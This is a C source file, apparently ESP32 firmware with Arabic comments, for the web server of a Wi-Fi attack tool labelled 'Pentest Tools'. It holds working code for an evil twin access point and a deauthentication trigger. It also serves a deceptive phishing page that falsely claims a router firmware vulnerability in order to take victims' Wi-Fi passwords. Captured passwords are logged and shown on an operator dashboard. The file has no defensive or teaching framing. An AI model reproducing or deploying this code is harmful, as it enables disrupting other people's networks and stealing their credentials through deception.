#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_http_server.h>
#include "evil_twin.h"
#include "deauther.h"
#include "target.h"
#include "wifiMng.h"

static const char *TAG = "WEBSERVER";
static httpd_handle_t server = NULL;

static char stolen_password[64] = "None";
static bool is_attack_active = false;

// ==========================================
// 1. Dashboard HTML (لوحة التحكم الخاصة بك)
// ==========================================
const char *dashboard_html = 
"<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
"<title>ESP32 Pentest Dashboard</title>"
"<style>body{font-family:sans-serif;background:#1e1e1e;color:#fff;text-align:center;padding:10px;}"
"h1{color:#00ffcc;} .btn{background:#4444ff;color:white;padding:12px 20px;text-decoration:none;display:inline-block;font-size:14px;margin:4px;cursor:pointer;border-radius:6px;border:none;}"
".btn-danger{background:#ff4444;} .btn-success{background:#44aa44;}"
".card{background:#2a2a2a;padding:15px;margin:10px auto;border-radius:10px;max-width:400px;}"
"input{padding:10px;border-radius:5px;border:none;margin:10px;width:80%;max-width:300px;}</style></head>"
"<body><h1>ESP32 Pentest Tools</h1>"

"<div class='card'><h2>1. Scan Networks</h2>"
"<button class='btn' onclick='fetch(\"/scan\").then(r=>r.text()).then(t=>document.getElementById(\"scan-res\").innerHTML=t)'>Start Scan</button>"
"<div id='scan-res' style='color:#ffcc00; font-size:12px;'>Click Scan...</div></div>"

"<div class='card'><h2>2. Evil Twin</h2>"
"<form action='/start_eviltwin' method='get'>"
"<input type='text' name='ssid' placeholder='Target SSID' required>"
"<input type='text' name='bssid' placeholder='BSSID (AA:BB:CC:DD:EE:FF)' required>"
"<input type='number' name='channel' placeholder='Channel' required>"
"<input type='submit' class='btn btn-danger' value='Start Evil Twin'></form></div>"

"<div class='card'><h2>3. Deauther</h2>"
"<form action='/start_deauth' method='get'>"
"<input type='text' name='bssid' placeholder='Target BSSID' required>"
"<input type='submit' class='btn btn-danger' value='Start Deauth'></form></div>"

"<div class='card'><h2>4. Stolen Credentials</h2>"
"<p style='color:#ffcc00;'>Password: <b>{PASSWORD}</b></p></div>"

"<div class='card'><h2>5. Stop All</h2>"
"<button class='btn btn-success' onclick='fetch(\"/stop\")'>Stop & Safe Mode</button></div>"
"</body></html>";

// ==========================================
// 2. Portal HTML (صفحة التصيد المقنعة)
// ==========================================
const char *portal_html = 
"<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
"<title>System Update Required</title>"
"<style>"
"* { box-sizing: border-box; }"
"body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f4f6f8; color: #333; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }"
".container { background-color: #ffffff; width: 100%; max-width: 450px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); overflow: hidden; margin: 20px; }"
".header { background-color: #1a56db; color: white; padding: 25px 20px; text-align: center; }"
".header svg { width: 50px; height: 50px; margin-bottom: 10px; fill: currentColor; }"
".header h1 { margin: 0; font-size: 22px; font-weight: 600; }"
".content { padding: 30px 25px; text-align: center; }"
".content p { font-size: 15px; line-height: 1.6; color: #555; margin-bottom: 25px; }"
".form-group { margin-bottom: 20px; text-align: left; }"
".form-group label { display: block; font-size: 13px; font-weight: 600; color: #444; margin-bottom: 8px; }"
".form-group input { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; outline: none; transition: border-color 0.3s; }"
".form-group input:focus { border-color: #1a56db; }"
".btn { background-color: #1a56db; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s; }"
".btn:hover { background-color: #1546b3; }"
".footer { padding: 15px; text-align: center; font-size: 11px; color: #999; border-top: 1px solid #eee; background: #fafafa; }"
".progress-bar { width: 100%; height: 6px; background-color: #e2e8f0; border-radius: 3px; margin-bottom: 20px; overflow: hidden; }"
".progress { width: 0%; height: 100%; background-color: #1a56db; transition: width 0.5s; }"
"</style></head>"
"<body>"
"<div class='container'>"
"  <div class='header'>"
"    <svg viewBox='0 0 24 24'><path d='M12 2L2 22h20L12 2zm0 3.8L18.5 20h-13L12 5.8zM11 10v5h2v-5h-2zm0 6v2h2v-2h-2z'/></svg>"
"    <h1>Firmware Update Required</h1>"
"  </div>"
"  <div class='content'>"
"    <div class='progress-bar'><div class='progress' id='progress'></div></div>"
"    <p>A critical security vulnerability has been detected in your router's current firmware. Please confirm your Wi-Fi password to authorize the update and restore your internet connection.</p>"
"    <form action='/submit_password' method='get'>"
"      <div class='form-group'>"
"        <label>Network Name (SSID)</label>"
"        <input type='text' value='Auto-Detected' disabled style='background:#f0f0f0; color:#777;'>"
"      </div>"
"      <div class='form-group'>"
"        <label>Wi-Fi Password</label>"
"        <input type='password' name='password' placeholder='Enter your password' required>"
"      </div>"
"      <button type='submit' class='btn'>Authorize Update</button>"
"    </form>"
"  </div>"
"  <div class='footer'>Secure Connection &bull; Router Management System v2.4</div>"
"</div>"
"<script>"
"  let progress = 0;"
"  let interval = setInterval(function() {"
"    if (progress >= 100) clearInterval(interval);"
"    else { progress += Math.floor(Math.random() * 10) + 1; if(progress > 100) progress = 100; document.getElementById('progress').style.width = progress + '%'; }"
"  }, 500);"
"</script>"
"</body></html>";

// ==========================================
// 3. المعالجات (Handlers)
// ==========================================
static esp_err_t index_handler(httpd_req_t *req) {
    char *response = malloc(4096);
    strcpy(response, dashboard_html);
    char *pos = strstr(response, "{PASSWORD}");
    if (pos) {
        char temp[4096];
        strncpy(temp, response, pos - response);
        temp[pos - response] = '\0';
        strcat(temp, stolen_password);
        strcat(temp, pos + strlen("{PASSWORD}"));
        strcpy(response, temp);
    }
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, response, strlen(response));
    free(response);
    return ESP_OK;
}

static esp_err_t portal_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, portal_html, strlen(portal_html));
    return ESP_OK;
}

static esp_err_t submit_password_handler(httpd_req_t *req) {
    char buf[100], password[64] = {0};
    if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
        httpd_query_key_value(buf, "password", password, sizeof(password));
        strncpy(stolen_password, password, sizeof(stolen_password) - 1);
        ESP_LOGI(TAG, "Stolen Password: %s", stolen_password);
    }
    httpd_resp_send(req, "<h1>Thank you! Router Updated.</h1>", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// دالة توجيه الجذر (تفرق بين لوحة التحكم وصفحة التصيد)
static esp_err_t root_handler(httpd_req_t *req) {
    // إذا كان المسار غير المسارات المعروفة (طلبات الأندرويد والآيفون) وكان الهجوم نشطاً
    if (strcmp(req->uri, "/") != 0 && strcmp(req->uri, "/scan") != 0 && 
        strcmp(req->uri, "/start_eviltwin") != 0 && strcmp(req->uri, "/start_deauth") != 0 && 
        strcmp(req->uri, "/stop") != 0 && strcmp(req->uri, "/submit_password") != 0 && 
        strcmp(req->uri, "/portal") != 0) {
        
        if (is_attack_active) {
            httpd_resp_set_status(req, "302 Found");
            httpd_resp_set_hdr(req, "Location", "/portal");
            httpd_resp_send(req, NULL, 0);
            return ESP_OK;
        }
    }

    if (strcmp(req->uri, "/") == 0) {
        return index_handler(req);
    }
    
    // أي مسار آخر، اعرض صفحة التصيد
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, portal_html, strlen(portal_html));
    return ESP_OK;
}

static esp_err_t scan_handler(httpd_req_t *req) {
    wifi_scan_config_t scan_config = { .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = false };
    esp_wifi_scan_start(&scan_config, true);
    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_num(&ap_count);
    if (ap_count == 0) { httpd_resp_send(req, "No networks found.", HTTPD_RESP_USE_STRLEN); return ESP_OK; }
    wifi_ap_record_t *ap_records = malloc(sizeof(wifi_ap_record_t) * ap_count);
    esp_wifi_scan_get_ap_records(&ap_count, ap_records);
    char *response = malloc(4096);
    strcpy(response, "<b>Found:</b><br>");
    for (int i = 0; i < ap_count && i < 10; i++) {
        char line[150];
        sprintf(line, "SSID: %s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %d<br>",
                (char*)ap_records[i].ssid, ap_records[i].bssid[0], ap_records[i].bssid[1], ap_records[i].bssid[2],
                ap_records[i].bssid[3], ap_records[i].bssid[4], ap_records[i].bssid[5], ap_records[i].primary);
        strcat(response, line);
    }
    free(ap_records);
    httpd_resp_send(req, response, strlen(response));
    free(response);
    return ESP_OK;
}

static esp_err_t start_eviltwin_handler(httpd_req_t *req) {
    char buf[200], ssid[32] = {0}, bssid_str[18] = {0}, channel_str[4] = {0};
    if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
        httpd_query_key_value(buf, "ssid", ssid, sizeof(ssid));
        httpd_query_key_value(buf, "bssid", bssid_str, sizeof(bssid_str));
        httpd_query_key_value(buf, "channel", channel_str, sizeof(channel_str));
        target_info_t target;
        memset(&target, 0, sizeof(target));
        strncpy(target.ssid, ssid, sizeof(target.ssid) - 1);
        target.channel = atoi(channel_str);
        sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target.bssid[0], &target.bssid[1], &target.bssid[2], &target.bssid[3], &target.bssid[4], &target.bssid[5]);
        evil_twin_start_attack(&target);
        is_attack_active = true; // تفعيل وضع الهجوم
        httpd_resp_send(req, "<h1 style='color:red;'>Evil Twin Started!</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }
    httpd_resp_send(req, "Error", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t start_deauth_handler(httpd_req_t *req) {
    char buf[100], bssid_str[18] = {0};
    if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
        httpd_query_key_value(buf, "bssid", bssid_str, sizeof(bssid_str));
        target_info_t target;
        memset(&target, 0, sizeof(target));
        sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target.bssid[0], &target.bssid[1], &target.bssid[2], &target.bssid[3], &target.bssid[4], &target.bssid[5]);
        deauther_send_frames(&target, DEAUTHER_ATTACK_DEAUTH_FRAME);
        httpd_resp_send(req, "<h1 style='color:red;'>Deauth Started!</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }
    httpd_resp_send(req, "Error", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t stop_handler(httpd_req_t *req) {
    evil_twin_stop_attack();
    deauther_stop();
    is_attack_active = false; // إيقاف وضع الهجوم
    httpd_resp_send(req, "<h1 style='color:green;'>All Attacks Stopped.</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// ==========================================
// 4. بدء الخادم
// ==========================================
void http_server_start(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_uri_handlers = 10;

    httpd_uri_t uris[] = {
        {.uri = "/", .method = HTTP_GET, .handler = root_handler},
        {.uri = "/portal", .method = HTTP_GET, .handler = portal_handler},
        {.uri = "/submit_password", .method = HTTP_GET, .handler = submit_password_handler},
        {.uri = "/scan", .method = HTTP_GET, .handler = scan_handler},
        {.uri = "/start_eviltwin", .method = HTTP_GET, .handler = start_eviltwin_handler},
        {.uri = "/start_deauth", .method = HTTP_GET, .handler = start_deauth_handler},
        {.uri = "/stop", .method = HTTP_GET, .handler = stop_handler},
        {.uri = "/*", .method = HTTP_GET, .handler = root_handler} // لاعتراض طلبات الأندرويد والآيفون
    };

    if (httpd_start(&server, &config) == ESP_OK) {
        for (int i = 0; i < 8; i++) {
            httpd_register_uri_handler(server, &uris[i]);
        }
        ESP_LOGI(TAG, "Full Evil Twin & Portal server started");
    } else {
        ESP_LOGE(TAG, "Failed to start web server");
    }
}

void http_server_stop(void) {
    if (server) {
        httpd_stop(server);
        server = NULL;
    }
}
